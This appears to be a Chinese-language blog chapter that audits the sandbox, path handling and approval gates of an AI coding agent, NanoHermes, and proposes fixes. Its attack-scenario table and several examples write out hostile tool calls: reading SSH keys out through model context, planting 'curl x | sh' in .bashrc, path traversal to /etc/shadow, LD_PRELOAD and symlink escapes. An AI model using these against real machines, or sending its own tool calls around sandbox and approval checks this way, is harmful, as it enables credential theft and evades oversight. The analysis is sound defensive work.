这套 ABI 处理有一个隐含假设：**常量表要和内核版本同步维护**。ABI 6 之后如果有 ABI 7 加了新的权限位，`ALL_FS` 里没有它，沙箱就管不到那个维度——而代码不会报错，因为「没声明处理这个维度」在内核看来是合法的（不处理 = 不限制）。这是 Landlock 的语义特点：**你声明处理哪些维度，就只限制那些维度；没声明的完全放行**。所以漏一个位不会失败，只会静默地少保护一层。

## 只读根加工作区可写：两条路径规则

规则集装好之后，加几条路径规则就决定了最终权限。实现里最多两条：

```rust
// 3. 全盘可读可执行，写权限默认拒绝
add_path_rule(rs_fd, root, READ_EXEC)?;
// 4. 工作区内完全放开（仅 workspace-write）
if let Some(ws) = ws {
    add_path_rule(rs_fd, ws, handled)?;
}
```

`READ_EXEC` 是 `FS_EXECUTE | FS_READ_FILE | FS_READ_DIR`——只有读和执行，没有任何写。因为 `handled` 里包含了所有写权限位，而根路径只授予了读和执行，所以**未声明的写权限默认拒绝**。这就是「默认拒绝、显式授予」的白名单模型。

第二种模式 `ReadOnly` 不加第二条规则，于是全盘只有读和执行，工作区也不例外。`WorkspaceWrite` 加第二条，工作区拿到全部权限（包括 `FS_MAKE_CHAR`、`FS_MAKE_SOCK` 等）。

这里有一个容易被忽略的后果：**`READ_EXEC` 覆盖整个 `/`，所以沙箱里的命令能读任何文件**——包括 `~/.ssh/id_rsa`、`~/.aws/credentials`、`.env`、以及别的项目的源码。沙箱只限制「写」，不限制「读」。

为什么这样设计？因为限制读会让绝大多数命令直接失效：`sh` 要读 `/bin/sh` 的依赖库，`cargo` 要读 `~/.cargo`，`git` 要读全局配置。要把读也限制住，需要把每条路径都列出来——那是一份很长、很容易漏、且随系统变化的清单。

但「能读全盘」意味着**数据外泄是一个真实风险**：`cat ~/.ssh/id_rsa` 是只读命令，免问；结果会作为工具输出回到模型，再随下一次请求发到模型服务商。沙箱对此毫无作用，因为它不限制读，也不限制网络。

## 网络没有被限制

Landlock 从 ABI 4 开始支持网络限制（TCP bind/connect），但这份实现把网络权限位传了 0：

```rust
let attr = RulesetAttr {
    handled_access_fs: handled,
    handled_access_net: 0,
    scoped: 0,
};
```

`handled_access_net = 0` 的语义是「我不处理网络维度」，也就是**网络完全不受限**。所以沙箱里的命令可以：

- 连任意 IP 和端口
- `curl` 上传文件到外部
- 建立反向 shell
- 访问云元数据服务（`169.254.169.254`）

对一个「只限制文件写入」的沙箱，这是合理的分层：它解决的是「别把我的磁盘改坏」，不是「别把我的数据传出去」。但如果目标是「让 Agent 跑不可信代码」，网络就是一个必须处理的维度，而当前实现完全敞开着。

补上的成本不高（ABI 4+）：

```rust
let attr = RulesetAttr {
    handled_access_fs: handled,
    // 处理 TCP bind/connect，但不授予任何端口
    handled_access_net: NET_BIND_TCP | NET_CONNECT_TCP,
    scoped: 0,
};
// 不给任何 net 规则 = 全部拒绝
```

代价是所有需要网络的命令都会失败。所以这应该是第三种模式（比如 `workspace-write-nonet`），而不是改现有模式。这也说明「沙箱模式」这个枚举的维度其实不止一个：filesystem、network、process（pid）、IPC——每加一个维度，组合数就翻倍。

## 失败即拒绝：为什么不肯降级

沙箱实现里最重要的一条策略在 `attach` 里：

```rust
let abi = landlock_abi().ok_or_else(|| {
    "this kernel does not expose Landlock (Linux >= 5.13 required); \
     refusing to run unsandboxed"
        .to_string()
})?;
```

内核不支持时，不是「降级成不沙箱」，而是**返回错误、命令不执行**。非 Linux 平台同理：

```rust
Err(format!(
    "sandbox mode {mode:?} requires Linux with Landlock support; refusing to run unsandboxed"
))
```

这个选择的意义在于：沙箱的承诺是「写入不会超出工作区」。如果内核不支持就静默降级，这个承诺就变成了「通常不会超出工作区」——而用户以为它是绝对的。**安全机制最危险的失效方式是静默失效**，因为它不改变用户的行为，只改变实际保护级别。

fail closed 的代价也很直接：在 macOS 和 Windows 上开沙箱，所有命令都会报错。所以启动时有一个提前警告：

```rust
if cfg.sandbox.is_active() && !sandbox::is_supported() {
    eprintln!(
        "warning: sandbox {:?} requested but this kernel does not expose Landlock; ..."
    );
}
```

这个警告是必要的，但它只打印一次，而且不阻止启动。更好的做法是：在 `goal` 模式 + 沙箱开启 + 平台不支持的组合下，直接拒绝启动——因为那个组合意味着「无人监督 + 每条命令都会失败」，跑下去只会浪费 token。

## 沙箱只覆盖子进程：最大的缺口

到这里，五道闸门都讲完了。现在看它们拼起来的实际覆盖面——这是本文最重要的一个表：

| 工具 | check_tool | 钩子 | 审批 | Landlock |
| --- | --- | --- | --- | --- |
| `read_file` | 是 | 是 | 否 | **否** |
| `write_file` | 是 | 是 | 否 | **否** |
| `edit_file` | 是 | 是 | 否 | **否** |
| `apply_patch` | 是 | 是 | 否 | **否** |
| `run_command`（前台） | 是 | 是 | 是 | 是 |
| `run_command`（后台） | 是 | 是 | 是 | 是 |
| `git_commit` | 是 | 是 | 是 | **否** |
| `web_fetch` | 是 | 是 | 否 | 否（进程内 HTTP） |

内置文件工具只受前两道管。它们不 spawn 子进程，所以 Landlock 完全够不着——沙箱是装在**子进程**上的，而 `write_file` 跑在 agent 自己的进程里。

这意味着 `sandbox: workspace-write` 的实际语义是「**子进程**不能写到工作区外」，而不是「这个 agent 不能写到工作区外」。agent 自己可以用一条 `write_file` 写到任何地方：

```text
write_file(path="/home/user/.ssh/authorized_keys", content="ssh-rsa AAAA...")
```

这条调用通过 `check_tool`（`write_file` 不在任何封禁列表里，`default` 模式下允许），不触发钩子（除非用户配了），不需要审批（审批只在 shell 里），不受沙箱限制（没有子进程）。四道闸门全部不适用。

`read_file` 同理，而且后果更直接：读 `~/.ssh/id_rsa` 的内容会作为工具结果回到模型上下文，然后随下一次 API 请求发出去。这是一条完整的「本地文件 → 远端服务」通道，不需要网络权限，因为**Agent 的模型调用本来就是出网的**。

修复这个东西不能靠「再加一道闸门」，因为缺的不是闸门，是**内置工具没有沙箱**。正确的修法有两个方向：

**方向一：给内置文件工具加路径检查。** 在 `resolve()` 之后加一个「必须在 root 内」的判定（下一节详述）。这是最小改动，也是最直接的修复。缺点是它只覆盖路径类工具，`web_fetch` 之类的仍然另说。

**方向二：让内置工具走沙箱。** 这不可行——Landlock 是进程级的、不可撤销的，一旦装上，agent 自己就读不到 `~/.nanohermes/config.json` 和系统 prompt 了。

所以方向一是唯一选择。而它的正确实现需要解决三件事：规范化（`..` 和绝对路径）、符号链接、以及「哪些路径算例外」（比如 `~/.nanohermes/` 下的会话文件必须可读写）。

## resolve 不做规范化：绝对路径与 .. 直通

当前实现只有四行：

```rust
pub fn resolve(root: &Path, p: &str) -> PathBuf {
    let path = Path::new(p);
    if path.is_absolute() {
        path.to_path_buf()
    } else {
        root.join(path)
    }
}
```

两个分支都**不做任何规范化**：

- 绝对路径原样返回，`/etc/passwd` 就是 `/etc/passwd`
- 相对路径只是 `join`，`../../etc/passwd` 会变成 `<root>/../../etc/passwd`

后者在文件系统层面等价于 `/etc/passwd`（取决于 root 的深度），所以 `..` 也能逃出去。这不是一个「理论漏洞」，它的利用难度和写 `/etc/passwd` 完全一样：

```text
read_file(path="../../../../etc/shadow")
```

`Path::is_absolute()` 对这个字符串返回 false，于是走 `join`，得到一个含 `..` 的路径，`fs::read` 会正常解析它。

修法是加一个「词法规范化 + 前缀检查」。注意不能只用 `canonicalize()`——它会解析符号链接，而且要求路径存在（新建文件时不存在）。正确的顺序是：

```rust
fn resolve_checked(root: &Path, p: &str) -> Result<PathBuf, String> {
    let joined = if Path::new(p).is_absolute() {
        PathBuf::from(p)
    } else {
        root.join(p)
    };
    // 1. 词法规范化：消掉 . 和 ..
    let mut out = PathBuf::new();
    for comp in joined.components() {
        match comp {
            Component::ParentDir => { out.pop(); }
            Component::CurDir => {}
            other => out.push(other),
        }
    }
    // 2. 前缀检查（词法层面）
    if !out.starts_with(root) {
        return Err(format!("path {} escapes the workspace", out.display()));
    }
    // 3. 若已存在，再按 canonical 结果复查一次（防符号链接）
    if let Ok(real) = out.canonicalize() {
        let root_real = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
        if !real.starts_with(&root_real) {
            return Err(format!("path {} resolves outside the workspace", real.display()));
        }
    }
    Ok(out)
}
```

三步各有用处：第一步挡住 `..`，第二步挡住绝对路径（`/etc/passwd` 不以 root 开头），第三步挡住符号链接。第三步只在路径存在时能做——新建文件的符号链接攻击要靠「对父目录做 canonicalize」来补，这一层通常会漏。

顺带说一句 `PathBuf::pop()` 的一个陷阱：当路径是 `/` 时 `pop` 返回 false 且不变，所以 `../../../etc/passwd` 会规范化成 `/etc/passwd`——这恰好被第二步挡住，但如果 root 在 `/` 下且比较用的是 `starts_with`，要小心别把 `/` 当成合法的 root。

## 符号链接：内核沙箱与内置工具的差异

符号链接这一节单独讲，因为 Landlock 和内置工具的语义在这里**完全相反**。

Landlock 的 `path_beneath` 规则是按「打开文件时解析出的真实路径」判定的。如果工作区里有一个软链接指向 `/etc/passwd`：

```text
ln -s /etc/passwd ws/link
```

那么沙箱里的命令 `echo x >> ws/link` 会被拒绝——因为内核解析 `link` 得到 `/etc/passwd`，而 `/etc/passwd` 那条路径只有 `READ_EXEC` 权限。Landlock 在这里是可靠的。

内置工具没有这层保护。`write_file` 走 `fs::write`，它跟随符号链接（`O_CREAT|O_TRUNC` 默认不 `O_NOFOLLOW`），所以 `write_file(path="link", content="x")` 会写到 `/etc/passwd`。

于是出现一个荒谬的组合：**开 `workspace-write` 沙箱之后，`run_command` 不能写 `/etc/passwd`，但 `write_file` 可以**。安全强度取决于调用哪个工具，而不是取决于配置。

这个反直觉的差异正是「沙箱只覆盖子进程」的直接后果。修法只有上一节那个第三步：

```rust
if let Ok(real) = out.canonicalize() {
    if !real.starts_with(&root_real) { return Err(...) }
}
```

对新建文件（路径不存在），`canonicalize` 失败，第三步跳过——这就是漏洞所在。补法是「对最深的已存在祖先做 canonicalize，再把剩余的不存在部分拼回去」：

```rust
let mut ancestor = out.clone();
let mut tail = Vec::new();
while !ancestor.exists() {
    if let Some(name) = ancestor.file_name() { tail.push(name.to_os_string()); }
    if !ancestor.pop() { break; }
}
let real_ancestor = ancestor.canonicalize()?;
let real_full = real_ancestor.join(tail.iter().rev().collect::<PathBuf>());
if !real_full.starts_with(&root_real) { return Err(...) }
```

这段大约 15 行，但它是「新建文件时防止穿越软链接」的唯一正确做法。少了它，攻击方式就是：先在仓库里提交一个指向 `~/.ssh` 的软链接目录，再让 agent 往「仓库内」写文件。

## 四个逃逸面

把前面的分析收拢，内置工具与子进程这两条路径的差异集中在四个面上：

| 逃逸面 | 子进程（`run_command`） | 内置工具 | 差异根源 |
| --- | --- | --- | --- |
| 绝对路径 | Landlock 限写 | 直通 | 沙箱在子进程 |
| `..` 穿越 | Landlock 按真实路径判定 | 直通 | `resolve` 不规范化 |
| 符号链接 | 内核解析真实路径 | 跟随且不检查 | `fs::write` 语义 |
| 网络 | 不限制（net=0） | 不限制 | 两者都不管 |

四个面里，前三个都是「子进程有保护、内置工具没有」。第四个是两者都没有。

这个表说明一件事：**在这套设计里，「安全强度」取决于模型选择用哪个工具**。同一个目标（写 `/etc/passwd`），走 `run_command` 会被沙箱挡住（如果开了），走 `write_file` 则畅通无阻。而模型并不知道这个区别——它只知道「哪个工具更顺手」。

所以真正需要修的不是某一道闸门，而是**把内置工具纳入同一套路径策略**。最经济的实现是让 `resolve` 直接返回 `Result`，强制所有调用点处理「越界」——这是一个编译期就能推动的改动：改了签名之后，所有 `let full = resolve(...)` 都会编译失败，编译器会列出所有需要处理的点。

## 权限模式与沙箱的交叉矩阵

`PermissionMode` 和 `SandboxMode` 是两个正交的维度，但用户经常只调其中一个，于是出现一些组合的预期和实际不符：

| 模式 \ 沙箱 | `off` | `read-only` | `workspace-write` |
| --- | --- | --- | --- |
| `default` | 全开 | 子进程只读 | 子进程限写工作区 |
| `accept-edits` | 编辑免问，命令问 | 同左 + 子进程只读 | 同左 + 子进程限写 |
| `plan` | 只读（无命令） | 只读（无命令） | 只读（无命令） |
| `goal` | **全开且不问** | 命令全失败（非 Linux） | 子进程限写 |
| `debug` | 可跑命令、不可写 | 可跑命令、不可写 | 子进程限写 |

两个值得注意的格子：

**`plan` 那一行，沙箱完全没用。** 因为 `run_command` 被模式封禁了，而沙箱只作用于子进程——没有子进程，沙箱就没有作用对象。所以 `plan` 模式的安全强度不随沙箱变化。但同时，`plan` 模式下的 `write_file` 也被封了，所以它反而是安全的（只要内置工具被正确封禁）。

**`goal` 那一行，`off` 是最危险的组合。** 无人监督 + 无审批 + 无沙箱 = 模型可以完全自由地操作这台机器。代码本身没有阻止这个组合，只是 `sandbox` 默认 `off`，所以**默认的 `goal` 模式就是最危险的那一格**。

这说明「模式」和「沙箱」不该是两个独立的 flag，而应该是一个「安全等级」的枚举，每个等级固定一组配置：

```text
--safety low     auto_approve=true,  sandbox=off
--safety medium  auto_approve=false, approval=on-request, sandbox=workspace-write
--safety high    auto_approve=false, approval=untrusted, sandbox=read-only, network=deny
```

两个 flag 的组合有 15 种，其中大部分没人会主动选，而有几种是危险的。用等级枚举把「有意义的组合」固化下来，比让用户自由组合更安全，也更好解释。

## plan 模式为什么不是只读沙箱

这里值得专门澄清一个常见误解：`plan` 模式看起来像「只读沙箱」，但它不是，差别有三点。

**第一，它封的是工具，不是路径。** `plan` 让 `write_file` 不可用，所以 agent 不能写文件。但它没有让「文件不可写」——`run_command` 也被封了，所以确实没有写路径了。这一层是有效的，但它的实现方式是「把可能写的东西都拿走」，而不是「允许一切但拒绝写」。后者才能覆盖未来新增的工具：如果明天加了一个 `db_query` 工具（可以 `UPDATE`），`plan` 模式不会自动封它。

**第二，它不限制读。** `plan` 模式下协议上是要「读代码、想方案」，所以 `read_file` 完全可用，能读全盘。这和沙箱的 `read-only` 完全不同——后者限制的是写，读也是全开。两个「只读」的含义不同：`plan` 是「我不改」，沙箱 `read-only` 是「进程不能改」。

**第三，它依赖 `blocked_tools` 这张手写表。** 五个工具名是硬编码的：

```rust
PermissionMode::Plan => &[
    "write_file",
    "edit_file",
    "apply_patch",
    "run_command",
    "git_commit",
],
```

如果新增一个能写文件的工具（比如 `git_apply`、`sql_exec`），必须记得加进这张表。忘了的话，`plan` 模式会静默地漏一个写入口。这类「靠维护列表保证安全」的机制，缺陷率随时间单调上升。

更稳的做法是给每个工具打一个 `capability` 标签（`fs.read`、`fs.write`、`process.spawn`、`net.egress`），模式封的是标签而不是名字：

```rust
pub fn blocked_capabilities(self) -> &'static [Capability] {
    match self {
        PermissionMode::Plan => &[Capability::FsWrite, Capability::ProcessSpawn, Capability::GitWrite],
        PermissionMode::Debug => &[Capability::FsWrite, Capability::GitWrite],
        _ => &[],
    }
}
```

这样新增工具时只要标了标签就自动被覆盖。改动大概 100 行（给 24 个工具各加一个标签），但它把「安全靠记得」变成了「安全靠分类」。

## goal 模式：没有人可以问

`goal` 模式的定位是「无人值守跑到目标达成」，所以它做了两件事：`auto_approve = true`、`approval = Never`。这两件事加起来等于「审批这道闸门被永久关闭」。

这个设计是诚实的，但它把安全责任完全压到了另外三道闸门上：

| 闸门 | 在 goal 模式下的状态 |
| --- | --- |
| 工具清单 | 有效（模型看不到被封禁的） |
| `check_tool` | 有效（但 `goal` 不封任何工具） |
| PreToolUse 钩子 | 有效（唯一的自定义拦截点） |
| 审批 | **关闭** |
| Landlock | 取决于 `--sandbox`（默认 off） |

所以 `goal` 模式的实际安全强度 = 「钩子配了什么」+「沙箱开没开」。如果两个都没配（默认情况），安全强度是零。

对无人值守场景，至少应该做这三件事：

**第一，默认开沙箱。** `goal` 模式下如果 `sandbox == Off`，启动时应该警告甚至拒绝。因为「没有人看着」和「没有任何文件系统限制」的组合，出事只是时间问题。

**第二，强制配置钩子。** 可以要求 `goal` 模式下至少有一个 PreToolUse 钩子，否则拒绝启动。钩子是唯一能在无人值守时表达「不要碰这些路径」的机制。

**第三，加预算上限。** 无人值守意味着可能无限循环。`max_iterations: 40` 是轮次上限，但没有「总命令数」「总写入字节」「总耗时」的上限。加一个 `max_wall_clock`（比如 30 分钟）是必要的——一个跑飞的目标模式可能在半小时内产生上百次写入。

这三条都不复杂，但它们把「goal 模式有多危险」从「取决于用户配置」变成「有明确下限」。

## 交叉验证：七个攻击场景

把前面所有分析放进具体场景，看每一道闸门是否真的挡住了。假设是默认配置（`auto_approve: true`、`sandbox: off`、`permission_mode: default`），只有 `check_tool` 和钩子在起作用。

| 场景 | 载荷 | 通过哪些闸门 | 结果 |
| --- | --- | --- | --- |
| 1 读密钥 | `read_file("~/.ssh/id_rsa")` | 全部 | 内容进上下文并出网 |
| 2 写启动项 | `write_file("/home/u/.bashrc", "curl x \| sh")` | 全部 | 持久化后门 |
| 3 穿越 | `read_file("../../../../etc/passwd")` | 全部 | 读到系统文件 |
| 4 假只读 | `run_command("sort -o ~/.bashrc x")` | 审批（误判为只读） | 覆盖文件 |
| 5 冒名程序 | `run_command("/tmp/x/ls -la")` | 审批（basename 命中） | 执行任意程序 |
| 6 预加载 | `run_command("LD_PRELOAD=/tmp/e.so ls")` | 审批（跳过赋值） | 任意代码执行 |
| 7 git 别名 | `run_command("git status")` | 审批（子命令命中） | 别名里的命令被执行 |

七个场景没有一个是「精巧的攻击链」——每一个都是单步、单条命令、不含任何混淆。它们能通过的原因是同一个：**判定依据是「命令长什么样」，而不是「它实际会做什么」**。

再叠加 `goal` 模式（审批关闭）：场景 1、2、3 依然通过，场景 4 到 7 也从「被误判放行」变成「连误判都不需要」——审批整道闸门都没了。这个对比说明一件事：**`auto_approve: true` 已经让审批形同虚设，所以 `goal` 模式在默认配置下没有额外损失，损失已经发生了。**

如果配上 `--ask`（`auto_approve: false` + `untrusted`）和 `--sandbox workspace-write`，场景 4 到 7 全部会被问到（`untrusted` 连只读也问），但**场景 1、2、3 仍然全部通过**——它们全是内置文件工具，而内置文件工具没有任何路径限制。

这是全文最重要的结论：在这套设计里，最有效的加固不是调审批策略，而是给 `resolve` 加越界检查，因为前三类场景是最高频、最容易被模型无意触发的（模型可能真的只是想读一个「在仓库外一层」的配置文件）。

## 七处可以加固的地方

按「挡住的攻击面」排序，不按工作量：

| 编号 | 加固点 | 挡住的场景 | 工作量 |
| --- | --- | --- | --- |
| 1 | `resolve` 加越界检查（词法 + canonical） | 场景 1、2、3 | 40 行 + 改签名 |
| 2 | 只读白名单加参数判定（`-o` / `-r` / `-s`） | 场景 4 | 25 行 |
| 3 | 显式路径不再按 basename 免问 | 场景 5 | 5 行 |
| 4 | 禁止前置环境变量赋值 | 场景 6 | 5 行 |
| 5 | 移除 git 免问，或校验别名 | 场景 7 | 5 或 40 行 |
| 6 | `auto_approve` 默认改 false，启动打印安全姿态 | 全部 | 3 行 |
| 7 | `goal` 模式强制要求沙箱或钩子 | 无人值守场景 | 15 行 |

前三项是真正的修复，后四项是策略调整。

**第 1 项最关键，也最容易做错。** 它要改 `resolve` 的签名（返回 `Result`），这会引发一串编译错误——每一处错误都是一个需要决定「越界时怎么办」的地方。`read_file` 应该返回错误，`write_file` 应该返回错误，但会话文件（`~/.nanohermes/sessions/*.json`）和记忆目录必须允许。所以需要两个入口：工作区路径走 `resolve_checked`，系统路径走一个显式的 `resolve_system`（并且只允许内部代码调用，不接受模型的路径参数）。

**第 2 项的判定要和 `VALUE_FLAGS` 一样的思路**：不是「信任程序」，而是「信任程序 + 参数组合」。现在实现是「边走边判」，`git_subcommand_is_read_only` 还把 `tokens` 消费掉了，所以每加一条规则都要动同一段循环——这是它积累了四个洞的结构性原因。更好的做法是把命令行先解析成一个中间结构（程序名、显式路径、环境赋值、参数列表各一组），再让四条判定各查各的字段。

**第 6 项只有 3 行，但它改变的是「默认值」。** 默认值的影响力远大于任何单点修复：它决定了所有没读文档的用户实际受到的防护。安全领域有个原则叫「默认安全」（secure by default），指的就是这个——不是让用户去开开关，而是让开关默认是开的，需要的人自己去关。

**第 7 项是给无人值守场景兜底。** `goal` 模式的合理前提是「沙箱可用 + 钩子已配」，否则它和一个 `while true; do $SHELL; done` 没有本质区别。启动时检查这两项，缺一个就拒绝，这是最省事的做法。

## 怎么测试安全边界

安全功能的测试和功能测试不一样：它测的是「不该发生的事有没有发生」。

NanoHermes 的沙箱测试是这个思路的直接体现——不是断言「命令成功」，而是断言「命令失败且文件不存在」：

```rust
// read-only: 工作区内的写入也必须被拒
assert_eq!(
    run_sandboxed(
        &format!("touch {}/a", ws.display()),
        SandboxMode::ReadOnly,
        &ws
    ),
    Some(false),
    "read-only sandbox must deny writes"
);
assert!(!ws.join("a").exists());

// workspace-write: 工作区内的写入允许
assert_eq!(
    run_sandboxed(&format!("touch {}/b", ws.display()),
                 SandboxMode::WorkspaceWrite, &ws),
    Some(true)
);
assert!(ws.join("b").exists());

// workspace-write: 工作区外的写入拒绝
assert_eq!(
    run_sandboxed(&format!("touch {}/c", outside.display()),
                 SandboxMode::WorkspaceWrite, &ws),
    Some(false)
);
assert!(!outside.join("c").exists());
```

三个断言覆盖了「可能出错的两个方向」：该拒的拒了（`a`、`c`），该放的放了（`b`）。第三个尤其重要——如果沙箱装错了（比如规则集创建失败但被忽略），`b` 会失败，测试立刻发现「沙箱把所有东西都拦住了」，而不是等到线上「所有命令都跑不了」。

`needs_approval` 的测试是分层断言，第一行专门钉住那个短路：`auto_approve` 优先于 `Untrusted`，所以 `needs_approval(true, Untrusted, "rm -rf /")` 必须返回 `false`。这种「两个配置项的组合语义」最容易在重构中悄悄改变，必须有测试兜住。其余三行分别覆盖 `Never` 全放、`Untrusted` 连 `ls` 都问、`OnRequest` 只问非只读。

`is_trusted_command` 的测试分正向和反向两组，正向里有一条值得注意：`git -C /repo diff --stat` 必须判为可信，它验证的是「带值 flag 的下一个 token 被跳过」这段逻辑。

但**测试里没有覆盖本文发现的四个洞**：`sort -o`、`/tmp/ls`、`LD_PRELOAD`、`git status`（别名）。这恰好说明安全测试的一个通病：**容易测「已知的攻击」，难测「没想到的攻击」**。

补这个缺口的方法不是「再加几条断言」——那只能覆盖你已经想到的洞。更有效的是**用性质（property）而不是用例来测**：

| 性质 | 怎么测 |
| --- | --- |
| 可信命令不应能写文件 | 在只读临时目录里跑每条可信命令的常见 flag 变体，断言目录内容不变 |
| 沙箱内的写入不越界 | 在工作区外放哨兵文件，断言内容不变 |
| 审批覆盖所有执行路径 | 枚举所有会 spawn 的工具，断言每个都调了 `needs_approval` |

第一条可以用脚本做：对白名单里每个程序，跑「程序名 + 各种常见 flag」的组合，检测临时目录有没有文件被创建。这能自动发现 `sort -o` 这类问题，因为它不依赖你知道 `sort` 有 `-o`。第三条是个静态检查：`rg 'Command::new|shell_command' src/` 找到所有 spawn 点，逐个确认上游有审批——漏掉一个路径在运行时可能永远不触发，静态看得见。

## 小结：先假设最坏，再逐层放宽

把这篇收拢成三句话。

**第一，安全是「纵深」，不是「强度」。** 五道闸门各自都能被绕过：工具清单只影响广告，`check_tool` 只按名字封，钩子是用户自己配的，审批只覆盖 shell，沙箱只覆盖子进程。但五道叠起来，一个攻击要同时绕过五层才能完全无声。这比「一道特别强的闸门」更可靠，因为强闸门有单点失效的风险。

**第二，最薄的一层往往不是你以为的那一层。** 直觉上「沙箱」是最硬的防线——它确实是最硬的，但它覆盖面最窄。真正的窟窿在「内置文件工具完全不受路径约束」，而那是个看起来最无害的地方：一个 `fs::write` 调用，没有子进程，没有 shell，没有审批。安全评审里最容易漏的就是这类「自己进程内的直接 I/O」。

**第三，默认值就是安全级别。** `auto_approve: true` + `sandbox: Off` 这两个默认值，让五道闸门里的两道直接失效。任何单点加固的价值都不如改这两个默认值——但改默认值会改变所有现有用户的行为，所以它需要一个明确的迁移决策，而不是顺手改掉。

NanoHermes 的安全实现有一个诚实的地方值得肯定：它不假装自己很安全。`attach` 在内核不支持时拒绝执行而不是降级，`auto_approve` 的短路写在第一行不加掩饰，`goal` 模式的注释直接说「没有人在旁边可以问」。这种「明确说出边界」的做法，比「声称安全但边界模糊」要好得多——因为只有知道边界在哪，才知道该往哪里加固。

下一篇进入多体：子代理、任务板与限流。05 讲的是「几件事同时做」，06 讲的是「这些事能做什么」，07 要把两者合起来——当四个子代理同时跑、每个都在你的机器上执行命令时，限流和隔离要怎么设计。
